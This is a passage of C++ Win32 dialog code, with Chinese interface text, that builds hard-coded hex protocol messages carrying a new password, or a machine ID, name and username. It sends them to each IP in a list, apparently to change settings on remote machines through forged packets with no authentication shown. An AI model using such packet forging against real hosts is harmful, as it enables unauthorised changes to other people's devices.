				MessageBoxW(hDlg, L"密码字段不能为空！", L"提示", MB_ICONINFORMATION);
				return (INT_PTR)FALSE;
			}
            wstring newPassword(passwordBuffer);
            string hexPassword = wstringToHex(newPassword);
            string head = generateHead_pw();
            string MsgHex = head + "204e0000c0a8be0188000000880000000040000000000000060000007b00000000000000010000000a000000000000000000000000000000500000005000000001000000" + hexPassword;
			while (MsgHex.length() < 325) {
				MsgHex += "0";
			}
            MsgHex += "20000000200000002000000000000";
			for (const auto& ip : ipList) {
				sendPacket(ip, MsgHex);
			}
            MessageBoxW(hDlg, L"发送完成，可到logs.txt查看日志", L"提示", MB_ICONINFORMATION);
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		}
	}
	}
	return (INT_PTR)FALSE;
}

INT_PTR CALLBACK ChangeNameDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    UNREFERENCED_PARAMETER(lParam);
    switch (message) {
    case WM_INITDIALOG: {
        SendDlgItemMessage(hDlg, CHANGENAME_WIN_ID_EDIT, EM_SETLIMITTEXT, 2, 0);
        SendDlgItemMessage(hDlg, CHANGENAME_WIN_NAME_EDIT, EM_SETLIMITTEXT, 31, 0);
		SendDlgItemMessage(hDlg, CHANGENAME_WIN_USERNAME_EDIT, EM_SETLIMITTEXT, 1024, 0);
		SetWindowTextW(GetDlgItem(hDlg, CHANGENAME_WIN_USERNAME_EDIT), L"admin");
        return (INT_PTR)TRUE;
    }
    case WM_COMMAND: {
        switch (LOWORD(wParam)) {
        case CHANGENAME_WIN_CANCEL: {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        case CHANGENAME_WIN_OK: {
            if (!ipList.size()) {
                MessageBoxW(hDlg, L"请先添加IP地址", L"提示", MB_ICONINFORMATION);
                return (INT_PTR)FALSE;
            }
            wchar_t nameBuffer[32], usernameBuffer[1025];
            char idBuffer[3];
            GetDlgItemTextA(hDlg, CHANGENAME_WIN_ID_EDIT, idBuffer, 3);
            GetDlgItemText(hDlg, CHANGENAME_WIN_NAME_EDIT, nameBuffer, 32);
            GetDlgItemText(hDlg, CHANGENAME_WIN_USERNAME_EDIT, usernameBuffer, 1025);
            if (idBuffer[0] == L'\0' || nameBuffer[0] == L'\0' || usernameBuffer[0] == L'\0') {
                MessageBoxW(hDlg, L"输入有误，请重新输入", L"提示", MB_ICONINFORMATION);
                return (INT_PTR)FALSE;
            }

            wstring name(nameBuffer), username(usernameBuffer);
			string id(idBuffer);   
            string nameHex = wstringToHex(name) + "0000";
			string unHex = wstringToHex(username);
            string head = "47434d4e000001004400000066b1e4923f9a364a943a3da3bd976041";
            string randend = randomEnd();
            string endHex = to_string(dis(gen)) + "00" + to_string(dis(gen)) + "00" + to_string(dis(gen)) + "00" + to_string(dis(gen)) + "00" + unHex + randend;
            //string endHex;

            string MsgHex = head + id + "000000" + nameHex;
            //判断nameHex的长度决定是否需要补充尾部，保证数据为96字节(192字符)
            int index = MsgHex.length() - 72;
			for (int i = index; i < endHex.length(); i++) {
				MsgHex += endHex[i];
			}
            for (const auto& ip : ipList) {
                sendPacket(ip, MsgHex);
            }
            MessageBoxW(hDlg, L"发送完成，可到logs.txt查看日志", L"提示", MB_ICONINFORMATION);
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        }
    }
    }
    return (INT_PTR)FALSE;
}